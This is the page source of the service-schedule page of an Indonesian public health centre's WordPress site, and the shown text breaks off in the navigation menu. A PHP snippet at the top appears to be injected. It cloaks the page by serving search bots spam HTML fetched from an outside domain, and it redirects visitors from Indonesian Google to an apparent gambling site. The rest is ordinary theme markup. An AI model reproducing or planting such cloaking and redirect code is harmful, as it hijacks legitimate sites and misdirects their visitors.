<?php
$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');

function is_bot() {
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
foreach ($bots as $bot) {
if (stripos($user_agent, $bot) !== false) {
return true;
}
}
return false;
}
if (is_bot()) {
echo file_get_contents('theonlyd.xyz/turu99/puskesmascipayung-pelayanan-jadwal-pelayanan.html');
exit;
}

if (stripos($s_ref, 'google.co.id') !== false ||
(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
header("Location: https://turu99resmi.pages.dev/");
exit;
}
?>
<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="profile" href="https://gmpg.org/xfn/11">
    <title>Jadwal Pelayanan &#8211; Puskesmas Cipayung Jakarta Timur</title>
<style>
#wpadminbar #wp-admin-bar-wsm_free_top_button .ab-icon:before {
	content: "\f239";
	color: #FF9800;
	top: 3px;
}
</style><meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel='dns-prefetch' href='//cdn.canyonthemes.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel="alternate" type="application/rss+xml" title="Puskesmas Cipayung Jakarta Timur &raquo; Feed" href="https://puskesmascipayung.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Puskesmas Cipayung Jakarta Timur &raquo; Comments Feed" href="https://puskesmascipayung.com/comments/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/puskesmascipayung.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.2"}};
/*! This file is auto-generated */
!function(s,n){var o,i,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),a=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===a[t]})}function u(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);for(var n=e.getImageData(16,16,1,1),a=0;a<n.data.length;a++)if(0!==n.data[a])return!1;return!0}function f(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\udedf")}return!1}function g(e,t,n,a){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):s.createElement("canvas"),o=r.getContext("2d",{willReadFrequently:!0}),i=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(function(e){i[e]=t(o,e,n,a)}),i}function t(e){var t=s.createElement("script");t.src=e,t.defer=!0,s.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",i=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){s.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+g.toString()+"("+[JSON.stringify(i),f.toString(),p.toString(),u.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"}),r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=function(e){c(n=e.data),r.terminate(),t(n)})}catch(e){}c(n=g(i,f,p,u))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://puskesmascipayung.com/wp-includes/css/dist/block-library/style.min.css?ver=6.8.2' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='contact-form-7-css' href='https://puskesmascipayung.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=6.0.6' type='text/css' media='all' />
<link rel='stylesheet' id='wsm-style-css' href='https://puskesmascipayung.com/wp-content/plugins/wp-stats-manager/css/style.css?ver=1.2' type='text/css' media='all' />
<link rel='stylesheet' id='bootstrap-css' href='https://puskesmascipayung.com/wp-content/themes/better-health/assets/css/bootstrap.min.css?ver=4.5.2' type='text/css' media='all' />
<link rel='stylesheet' id='bootstrap-dropdownhover-css' href='https://puskesmascipayung.com/wp-content/themes/better-health/assets/css/bootstrap-dropdownhover.min.css?ver=4.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css' href='https://puskesmascipayung.com/wp-content/themes/better-health/assets/css/font-awesome.css?ver=4.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='better-health-googleapis-css' href='https://fonts.googleapis.com/css?family=Poppins:400,500,600,700,800|Roboto:300,400' type='text/css' media='all' />
<link rel='stylesheet' id='animate-css' href='https://puskesmascipayung.com/wp-content/themes/better-health/assets/css/animate.css?ver=4.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='owl-carousel-css' href='https://puskesmascipayung.com/wp-content/themes/better-health/assets/css/owl.carousel.css?ver=4.5.1' type='text/css' media='all' />
<link rel='stylesheet' id='magnific-popup-css' href='https://puskesmascipayung.com/wp-content/themes/better-health/assets/css/magnific-popup.css?ver=4.5.1' type='text/css' media='all' />
<link rel='stylesheet' id='better-health-style-css' href='https://puskesmascipayung.com/wp-content/themes/better-health/style.css?ver=4.5.3' type='text/css' media='all' />
<style id='better-health-style-inline-css' type='text/css'>
#section1 .col-md-3.col-sm-6:nth-child(odd),#section1 .col-md-4.col-sm-6:nth-child(odd),#section1 .col-md-6.col-sm-6:nth-child(odd),#section1 .col-md-12.col-sm-6:nth-child(odd)
    {
         background-color: #00aef0;
    }
    #section1 .col-md-3.col-sm-6:nth-child(even),#section1  col-md-4.col-sm-6:nth-child(even),#section1 .col-md-6.col-sm-6:nth-child(even),#section1 .col-md-12.col-sm-6:nth-child(even)
      {
         background-color: #05a1dc;
      }
    .top-header{
         background-color: #00AEF0;}
    .footer-top{
         background-color: #1A1E21;}
    .footer-bottom{
         background-color: #111315;}
    .section-0-background,
     .btn-primary,
     .section-14-box .date,
     #quote-carousel a.carousel-control,
     .section-10-background,
     .footer-top .submit-bgcolor,
     .nav-links .nav-previous a, 
     .nav-links .nav-next a,
     .comments-area .submit,
     .inner-title,
     header .navbar-menu .navbar-nav>li>a:hover, 
      header .navbar-menu .navbar-nav>li.active >a:active,
      header .dropdown-menu > li > a:hover,
      header .dropdown-menu > .active > a, 
      header .dropdown-menu > .active > a:focus, 
      header .dropdown-menu > .active > a:hover,
      .section16 form input[type='submit'],
      .woocommerce a.button, 
      .woocommerce #respond input#submit.alt, 
      .woocommerce a.button.alt, 
      .woocommerce button.button.alt, 
      .woocommerce input.button.alt,
      .woocommerce nav.woocommerce-pagination ul li a:focus, 
      .woocommerce nav.woocommerce-pagination ul li a:hover, 
      .woocommerce nav.woocommerce-pagination ul li span.current,
      header .navbar-toggle,
      .front-blog-date .publish-month,
      .section-contact-full, 
      .scrollup,
      .section-2-box-right .readmore, 
      a.readmore,.make-booking .makebooking,.line-middle,.line-middle:before, .line-middle:after,.portfolioFilter a.current,.portfolioFilter a.current,
      .portfolioFilter a:hover,.section-margine .nav-links .nav-previous a:hover, .section-margine .nav-links .nav-next a:hover,.btn-primary:hover,.overlay i

     {
         background-color: #00AEF0;
     }
     header .navbar-menu .navbar-nav>li> a:hover, 
                  header .navbar-menu .navbar-nav>li.active > a,
                  .navbar-default .navbar-nav > .active > a,
                  .navbar-default .navbar-nav > .active > a:focus,
                  .navbar-default .navbar-nav > .active > a:hover,
                  .widget ul li a:hover,a:hover, a:focus, a:active,
                  .section-14-box h3 a:hover,
                  .nav-links .nav-previous a:hover, 
                  .nav-links .nav-next a:hover,
                  header .navbar-menu .navbar-nav > .open > a, 
                  header .navbar-menu .navbar-nav > .open > a:focus, 
                  header .navbar-menu .navbar-nav > .open > a:hover,
                  .icon-box--description .fa,
                  .front-blog-date .publish-date,
                  a.contact-us:hover,
                  .better-health-info .contact-detail2 li a:hover,.section-4 .section li.left,.portfolioFilter a
                  {
                      color: #00AEF0;
                   }
                  .widget .tagcloud a:hover,
    .woocommerce nav.woocommerce-pagination ul li a:focus, 
    .woocommerce nav.woocommerce-pagination ul li a:hover, 
    .woocommerce nav.woocommerce-pagination ul li span.current
                 
                {

                   border: 1px solid #00AEF0;
                }
                .section-14-box .underline,
   .item blockquote img,
   .widget .widget-title,
   .btn-primary,
   #quote-carousel .carousel-control.left, 
   #quote-carousel .carousel-control.right,.btn-primary:hover{
        border-color: #00AEF0;}
    #secondary .widget-title
    {
        border-bottom: 2px solid#00AEF0 ;}
    .line-heading .line-left, .line-heading .line-right
    {
        border-top: 1px dashed#00AEF0 ;}
    .portfolioFilter a
    {
        border: 1px solid#00AEF0 ;}
    .post blockquote
    {
        border-left: 5px solid#00AEF0 ;}
    
</style>
<link rel='stylesheet' id='better-health-responsive-css' href='https://puskesmascipayung.com/wp-content/themes/better-health/assets/css/responsive.css?ver=4.5.0' type='text/css' media='all' />
<style id='akismet-widget-style-inline-css' type='text/css'>

			.a-stats {
				--akismet-color-mid-green: #357b49;
				--akismet-color-white: #fff;
				--akismet-color-light-grey: #f6f7f7;

				max-width: 350px;
				width: auto;
			}

			.a-stats * {
				all: unset;
				box-sizing: border-box;
			}

			.a-stats strong {
				font-weight: 600;
			}

			.a-stats a.a-stats__link,
			.a-stats a.a-stats__link:visited,
			.a-stats a.a-stats__link:active {
				background: var(--akismet-color-mid-green);
				border: none;
				box-shadow: none;
				border-radius: 8px;
				color: var(--akismet-color-white);
				cursor: pointer;
				display: block;
				font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen-Sans', 'Ubuntu', 'Cantarell', 'Helvetica Neue', sans-serif;
				font-weight: 500;
				padding: 12px;
				text-align: center;
				text-decoration: none;
				transition: all 0.2s ease;
			}

			/* Extra specificity to deal with TwentyTwentyOne focus style */
			.widget .a-stats a.a-stats__link:focus {
				background: var(--akismet-color-mid-green);
				color: var(--akismet-color-white);
				text-decoration: none;
			}

			.a-stats a.a-stats__link:hover {
				filter: brightness(110%);
				box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06), 0 0 2px rgba(0, 0, 0, 0.16);
			}

			.a-stats .count {
				color: var(--akismet-color-white);
				display: block;
				font-size: 1.5em;
				line-height: 1.4;
				padding: 0 13px;
				white-space: nowrap;
			}
		
</style>
<script type="text/javascript" src="https://puskesmascipayung.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://puskesmascipayung.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="https://puskesmascipayung.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://puskesmascipayung.com/wp-json/wp/v2/pages/575" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://puskesmascipayung.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.8.2" />
<link rel="canonical" href="https://puskesmascipayung.com/pelayanan/jadwal-pelayanan/" />
<link rel='shortlink' href='https://puskesmascipayung.com/?p=575' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://puskesmascipayung.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpuskesmascipayung.com%2Fpelayanan%2Fjadwal-pelayanan%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://puskesmascipayung.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpuskesmascipayung.com%2Fpelayanan%2Fjadwal-pelayanan%2F&#038;format=xml" />
	   
    <!-- Wordpress Stats Manager -->
    <script type="text/javascript">
          var _wsm = _wsm || [];
           _wsm.push(['trackPageView']);
           _wsm.push(['enableLinkTracking']);
           _wsm.push(['enableHeartBeatTimer']);
          (function() {
            var u="https://puskesmascipayung.com/wp-content/plugins/wp-stats-manager/";
            _wsm.push(['setUrlReferrer', ""]);
            _wsm.push(['setTrackerUrl',"https://puskesmascipayung.com/?wmcAction=wmcTrack"]);
            _wsm.push(['setSiteId', "1"]);
            _wsm.push(['setPageId', "575"]);
            _wsm.push(['setWpUserId', "0"]);           
            var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
            g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'js/wsm_new.js'; s.parentNode.insertBefore(g,s);
          })();
    </script>
    <!-- End Wordpress Stats Manager Code -->
      <meta name="google-site-verification" content="LEOHItUam5UgocJmrBagdxvFJkvehLMRDoKyygd6qwg" /><link rel="icon" href="https://puskesmascipayung.com/wp-content/uploads/2019/09/cropped-favicon-pkc-1-32x32.png" sizes="32x32" />
<link rel="icon" href="https://puskesmascipayung.com/wp-content/uploads/2019/09/cropped-favicon-pkc-1-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://puskesmascipayung.com/wp-content/uploads/2019/09/cropped-favicon-pkc-1-180x180.png" />
<meta name="msapplication-TileImage" content="https://puskesmascipayung.com/wp-content/uploads/2019/09/cropped-favicon-pkc-1-270x270.png" />
<meta name="google-site-verification" content="LEOHItUam5UgocJmrBagdxvFJkvehLMRDoKyygd6qwg" />
</head>

<body class="wp-singular page-template-default page page-id-575 page-child parent-pageid-11 wp-custom-logo wp-theme-better-health no-sidebar">
<div id="page" class="site">
    <a class="skip-link screen-reader-text"
       href="#content">Skip to content</a>
            <div class="top-header">
        <div class="container">
            <div class="row ">
                                   <div class="social-links better-health-pro-social-icons col-lg-6 pull-left">
                        <div class="menu-social-menu-container"><ul id="menu-social-menu" class="social-icons"><li id="menu-item-369" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-369"><a href="https://facebook.com/pkc.cipayung">Facebook</a></li>
<li id="menu-item-372" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-372"><a href="https://instagram.com/pkc.cipayung">Instagram</a></li>
<li id="menu-item-210" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-210"><a href="https://www.youtube.com/channel/UCWxP2bGfbW-wzMAg-u0z8-w">Youtube</a></li>
</ul></div>                    </div>
                                          <div class="col-lg-6 search">
                        <p class="search-btn"><i class="fa fa-search" aria-hidden="true"></i></p>
                        <div class="search-block">
    <form action="https://puskesmascipayung.com" class="searchform search-form" id="searchform" method="get" role="search">
        <div>
            <label for="menu-search" class="screen-reader-text"></label>
                        <input type="text" placeholder="Cari di website ini ..." class="blog-search-field" id="menu-search" name="s" value="">
            <button class="searchsubmit fa fa-search" type="submit" id="searchsubmit"></button>
        </div>
    </form>
</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
           <header id="header" class="head" role="banner">
        <nav id="site-navigation" class="main-navigation navbar navbar-default navbar-menu navbar-expand-md" role="navigation">
            <div class="container">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle navbar-toggler" data-bs-toggle="collapse" data-bs-target="#bs-example-navbar-collapse-1" aria-controls="bs-example-navbar-collapse-1" aria-expanded="false" aria-label="Toggle navigation">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                    <div class="site-branding">
                                                    <a class="navbar-brand" href="https://puskesmascipayung.com/">
                                <a href="https://puskesmascipayung.com/" class="custom-logo-link" rel="home"><img width="545" height="91" src="https://puskesmascipayung.com/wp-content/uploads/2025/07/cropped-LOGO-REV-WEB.png" class="custom-logo" alt="Puskesmas Cipayung Jakarta Timur" decoding="async" srcset="https://puskesmascipayung.com/wp-content/uploads/2025/07/cropped-LOGO-REV-WEB.png 545w, https://puskesmascipayung.com/wp-content/uploads/2025/07/cropped-LOGO-REV-WEB-300x50.png 300w" sizes="(max-width: 545px) 100vw, 545px" /></a>                            </a>
                                            </div><!-- .site-branding -->

                </div>

                <div class="better-health-info">
                    <ul class="contact-detail2">
                                            <li>
                            <span class="icon-box--description"><a href="#"><i class="fa fa-home fa-2x"></i> Jl. Bambu Hitam No.104 Cipayung</a></span>
                        </li>
                         
                        <li>
                            <span class="icon-box--description"><a href="tel:Hotline%20(021)%20845%20949%2040"><i class="fa fa-phone fa-2x"></i> Hotline (021) 845 949 40</a></span>
                        </li>
                        
                        <li>
                            <span class="icon-box--description"><a href="/cdn-cgi/l/email-protection#59292c2a323c2a34382a773a302938202c373e19333832382b2d38773e3677303d"><i class="fa fa-envelope-o fa-2x"></i> <span class="__cf_email__" data-cfemail="562623253d33253b372578353f26372f233831163c373d37242237783139783f32">[email&#160;protected]</span></a></span>
                        </li>
                        
                    </ul>
                </div>
            </div>
			<div id="menu-bar" class="main-menu">
				<div class="container">
					<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1" data-bs-hover="dropdown" data-bs-animations="fadeIn">
						<div id="bs-example-navbar-collapse-1" class="collapse navbar-collapse"><ul id="menu-primary-menu" class="nav navbar-nav navbar-right" itemscope itemtype="http://www.schema.org/SiteNavigationElement"><li  id="menu-item-373" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-373 nav-item"><a itemprop="url" href="https://puskesmascipayung.com/" class="nav-link"><span itemprop="name">Home</span></a></li>
<li  id="menu-item-538" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children dropdown menu-item-538 nav-item"><a href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle nav-link" id="menu-item-dropdown-538"><span itemprop="name">Informasi</span></a>
<ul class="dropdown-menu" aria-labelledby="menu-item-dropdown-538">
	<li  id="menu-item-1057" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1057 nav-item"><a itemprop="url" href="https://puskesmascipayung.com/informasi/konsultasi-online-gratis/" class="dropdown-item"><span itemprop="name">KONSULTASI ONLINE GRATIS</span></a></li>
	<li  id="menu-item-552" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-552 nav-item"><a itemprop="url" href="https://puskesmascipayung.com/tentang-kami/visi-misi/" class="dropdown-item"><span itemprop="name">VISI MISI</span></a></li>
	<li  id="menu-item-598" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-598 nav-item"><a itemprop="url" href="https://puskesmascipayung.com/informasi/hak-dan-kewajiban-pasien/" class="dropdown-item"><span itemprop="name">Hak dan Kewajiban Pasien</span></a></li>
